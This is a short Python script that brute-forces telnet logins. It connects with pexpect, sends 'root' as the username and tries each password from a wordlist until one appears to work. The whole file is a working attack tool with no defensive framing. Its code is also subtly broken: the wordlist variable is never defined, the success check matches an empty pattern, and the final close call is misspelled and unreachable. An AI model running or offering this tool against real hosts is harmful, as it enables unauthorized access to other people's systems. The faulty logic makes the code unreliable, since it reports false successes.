import pexpect


def connect(ip, port):
    connStr = 'telnet ' + ip + ' ' + port
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.EOF, 'Username:', \
                        '[P|p]assword:', pexpect.TIMEOUT], timeout=10)

    if ret == 0:
        print('[-] ' + port + ' is not Telnet port.')
        a = 0
        return a
    if ret == 1:  # Telnet PORT
        print("\033[34m" + '[+] ' + port + 'is Telnet port!' + "\033[0m")
        print('-------- PASSWORD ATTACKING -------- ')
        child.sendline('root')
        ret = child.expect([pexpect.TIMEOUT, pexpect.EOF, \
                            '[P|p]assword'], timeout=5)
        a = 1
        if ret == 2:
            for line in fn.readlines():
                print('[-] Password :' + line.strip('\n'))
                child.sendline(line.strip('\n'))
                prom = child.expect([pexpect.EOF, pexpect.TIMEOUT, ''], timeout=5)
                if prom == 2:
                    print("\033[31m" + '[+] FIND ! PASSWORD :' + line.strip('\n') + "\033[0m")
                    print('-------------------------------------')
                    return a
        print('------------------------------------- ')
        return a
    if ret == 2:  # FTP
        print('[+] ' + port + ' is Telnet port. ')
        a = 1
        return a
    else:
        print('[-] ' + port + ' is not Telnet port.')
        a = 0
        return a

    chlid.close()